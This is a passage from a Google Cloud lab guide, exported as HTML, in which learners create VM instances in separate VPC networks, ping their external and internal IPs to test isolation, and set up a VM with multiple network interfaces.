privatenet-vm-1 --zone=us-west1-a --machine-type=e2-micro --subnet=privatesubnet-1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-04-972c7275ce91/zones/"us-west1-a"/instances/privatenet-vm-1].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: privatenet-vm-1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: us-west1-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 172.16.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.135.195.199</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><h4 id='test-completed-task-13'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created VM instance in privatenet network, you will see an assessment score.</span></p><p><span>Create the privatenet-vm-1 instance</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Run the following command to list all the VM instances (sorted by zone):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances list --sort-by=ZONE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: mynet-vm-2</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: europe-west4-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.164.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.147.23.235</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: mynet-vm-1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: us-west1-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.128.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 35.232.221.58</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 360px;"></div><div class="CodeMirror-gutters" style="display: none; height: 360px;"></div></div></div></pre><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>You see that the VM instances are listed in the Cloud console.</span></p></li><li><p><span>Click on </span><strong><span>Column display options</span></strong><span>, then select </span><strong><span>Network</span></strong><span>. Click </span><strong><span>Ok</span></strong><span>.</span></p><p><span>There are three instances in </span><strong><code>us-west1</code></strong><span> and one instance in </span><strong><code>europe-west4</code></strong><span>. However, these instances are spread across three VPC networks (</span><strong><span>managementnet</span></strong><span>, </span><strong><span>mynetwork</span></strong><span> and </span><strong><span>privatenet</span></strong><span>), with no instance in the same zone and network as another. In the next section, you explore the effect this has on internal connectivity.</span></p></li></ol><h2 id='task-3-explore-the-connectivity-between-vm-instances'><span>Task 3. Explore the connectivity between VM instances</span></h2><p><span>Explore the connectivity between the VM instances. Specifically, determine the effect of having VM instances in the same zone versus having instances in the same VPC network.</span></p><h3 id='ping-the-external-ip-addresses'><span>Ping the external IP addresses</span></h3><p><span>Ping the external IP addresses of the VM instances to determine if you can reach the instances from the public internet.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Note the external IP addresses for </span><strong><span>mynet-vm-2</span></strong><span>, </span><strong><span>managementnet-vm-1</span></strong><span>, and </span><strong><span>privatenet-vm-1</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>mynet-vm-1</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span></p></li><li><p><span>To test connectivity to </span><strong><span>mynet-vm-2</span></strong><span>&#39;s external IP, run the following command, replacing </span><strong><span>mynet-vm-2</span></strong><span>&#39;s external IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping -c 3 'Enter mynet-vm-2 external IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This should work!</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>managementnet-vm-1</span></strong><span>&#39;s external IP, run the following command, replacing </span><strong><span>managementnet-vm-1</span></strong><span>&#39;s external IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping -c 3 'Enter managementnet-vm-1 external IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This should work!</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>privatenet-vm-1</span></strong><span>&#39;s external IP, run the following command, replacing </span><strong><span>privatenet-vm-1</span></strong><span>&#39;s external IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter privatenet-vm-1 external IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This should work!</span></p><p><strong><span>Note:</span></strong><span> You are able to ping the external IP address of all VM instances, even though they are either in a different zone or VPC network. This confirms public access to those instances is only controlled by the </span><strong><span>ICMP</span></strong><span> firewall rules that you established earlier.</span></p><h3 id='ping-the-internal-ip-addresses'><span>Ping the internal IP addresses</span></h3><p><span>Ping the internal IP addresses of the VM instances to determine if you can reach the instances from within a VPC network.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Note the internal IP addresses for </span><strong><span>mynet-vm-2</span></strong><span>, </span><strong><span>managementnet-vm-1</span></strong><span>, and </span><strong><span>privatenet-vm-1</span></strong><span>.</span></p></li><li><p><span>Return to the </span><strong><span>SSH</span></strong><span> terminal for </span><strong><span>mynet-vm-1</span></strong><span>.</span></p></li><li><p><span>To test connectivity to </span><strong><span>mynet-vm-2</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>mynet-vm-2</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter mynet-vm-2 internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> You are able to ping the internal IP address of </span><strong><span>mynet-vm-2</span></strong><span> because it is on the same VPC network as the source of the ping (</span><strong><span>mynet-vm-1</span></strong><span>), even though both VM instances are in separate zones, regions and continents!</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>managementnet-vm-1</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>managementnet-vm-1</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter managementnet-vm-1 internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> This should not work as indicated by a 100% packet loss!</span></p><ol start='' ><li><p><span>To test connectivity to </span><strong><span>privatenet-vm-1</span></strong><span>&#39;s internal IP, run the following command, replacing </span><strong><span>privatenet-vm-1</span></strong><span>&#39;s internal IP:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 3 'Enter privatenet-vm-1 internal IP here'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> This should not work either as indicated by a 100% packet loss! You are unable to ping the internal IP address of </span><strong><span>managementnet-vm-1</span></strong><span> and </span><strong><span>privatenet-vm-1</span></strong><span> because they are in separate VPC networks from the source of the ping (</span><strong><span>mynet-vm-1</span></strong><span>), even though they are all in the same region </span><strong><code>us-west1</code></strong><span>.</span></p><p><span>VPC networks are by default isolated private networking domains. However, no internal IP address communication is allowed between networks, unless you set up mechanisms such as VPC peering or VPN.</span></p><p><strong><span>Note:</span></strong><span> For the below task consider </span><strong><span>region_1 = </span><code>us-west1</code></strong><span> and </span><strong><span>region_2 = </span><code>europe-west4</code></strong></p><p><span>`</span></p><p>&nbsp;</p><p><span>Which instance(s) should you be able to ping from mynet-region-1-vm using internal IP addresses?</span></p><p>&nbsp;</p><p><span>managementnet-region-1-vm</span></p><p>&nbsp;</p><p><span>privatenet-region-1-vm</span></p><p>&nbsp;</p><p><span>mynet-region-2-vm</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><h2 id='task-4-create-a-vm-instance-with-multiple-network-interfaces'><span>Task 4. Create a VM instance with multiple network interfaces</span></h2><p><span>Every instance in a VPC network has a default network interface. You can create additional network interfaces attached to your VMs. Multiple network interfaces enable you to create configurations in which an instance connects directly to several VPC networks (up to 8 interfaces, depending on the instance&#39;s type).</span></p><h3 id='create-the-vm-instance-with-multiple-network-interfaces'><span>Create the VM instance with multiple network interfaces</span></h3><p><span>Create the </span><strong><span>vm-appliance</span></strong><span> instance with network interfaces in </span><strong><span>privatesubnet-1</span></strong><span>, </span><strong><span>managementsubnet-1</span></strong><span> and </span><strong><span>mynetwork</span></strong><span>. The CIDR ranges of these subnets do not overlap, which is a requirement for creating a VM with multiple network interface controllers (NICs).</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>:</span></p><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><span>vm-appliance</span></td></tr><tr><td style='text-align:left;' ><strong><span>Region</span></strong></td><td style='text-align:left;' ><code>us-west1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Zone</span></strong></td><td style='text-align:left;' ><code>us-west1-a</code></td></tr><tr><td style='text-align:left;' ><strong><span>Series</span></strong></td><td style='text-align:left;' ><code>E2</code></td></tr><tr><td style='text-align:left;' ><strong><span>Machine Type</span></strong></td><td style='text-align:left;' ><code>e2-standard-4</code></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> The number of interfaces allowed in an instance is dependent on the instance&#39;s machine type and the number of vCPUs. The e2-standard-4 allows up to 4 network interfaces. Refer to </span><a href='https://cloud.google.com/vpc/docs/create-use-multiple-interfaces#max-interfaces'><span>the Maximum number of network interfaces section of the Google Cloud Guide</span></a><span> for more information.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p><p><span>For </span><strong><span>Network interfaces</span></strong><span>, click the dropdown to edit. Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>privatenet</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>privatesubnet-1</span></td></tr></tbody></table></figure><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p><p><span>Click </span><strong><span>Add a network interface</span></strong><span>.</span></p><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>managementnet</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>managementsubnet-1</span></td></tr></tbody></table></figure><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p><p><span>Click </span><strong><span>Add a network interface</span></strong><span>.</span></p><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>mynetwork</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>mynetwork</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-14'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created VM instance with multiple network interfaces, you will see an assessment score.</span></p><p><span>Create a VM instance with multiple network interfaces</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='explore-the-network-interface-details'><span>Explore the network interface details</span></h3><p><span>Explore the network interface details of </span><strong><span>vm-appliance</span></strong><span> within the Cloud console and within the VM&#39;s terminal.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>nic0</span></strong><span> within the </span><strong><span>Internal IP</span></strong><span> address of </span><strong><span>vm-appliance</span></strong><span> to open the </span><strong><span>Network interface details</span></strong><span> page.</span></p></li><li><p><span>Verify that </span><strong><span>nic0</span></strong><span> is attached to </span><strong><span>privatesubnet-1</span></strong><span>, is assigned an internal IP address within that subnet (172.16.0.0/24), and has applicable firewall rules.</span></p></li><li><p><span>Click </span><strong><span>nic0</span></strong><span> and select </span><strong><span>nic1</span></strong><span>.</span></p></li><li><p><span>Verify that </span><strong><span>nic1</span></strong><span> is attached to </span><strong><span>managementsubnet-1</span></strong><span>, is assigned an internal IP address within that subnet (10.130.0.0/20), and has applicable firewall rules.</span></p></li><li><p><span>Click </span><strong><span>nic1</span></strong><span> and select </span><strong><span>nic2</span></strong><span>.</span></p></li><li><p><span>Verify that </span><strong><span>nic2</span></strong><span> is attached to </span><strong><span>mynetwork</span></strong><span>, is 